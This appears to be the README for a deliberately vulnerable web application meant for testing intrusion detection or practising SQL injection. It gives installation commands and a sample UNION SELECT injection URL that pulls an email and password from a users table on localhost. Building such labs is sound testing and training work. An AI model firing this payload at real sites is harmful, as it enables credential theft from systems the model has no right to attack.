# Simple SQLi Web

It could be the case that you need to check wether your HIDS/NIDS is capable of detecting SQLi or maybe you are a Script-Kiddie who wants to practice some attacks. 

# Instalation

```bash
git clone https://github.com/Marmeus/SSQLIWEB.git
cd SSQLIWEB
chmod +x installer.sh
sudo ./installer.sh
```

# Execution

Once, it has been installed you can access to the vulnerable application at http://localhost/SSQLIWEB

# Exploitation

```bash
http://localhost/SSQLIWEB/index.php?id=-1 UNION (SELECT id, email, password from users where id=1)
```
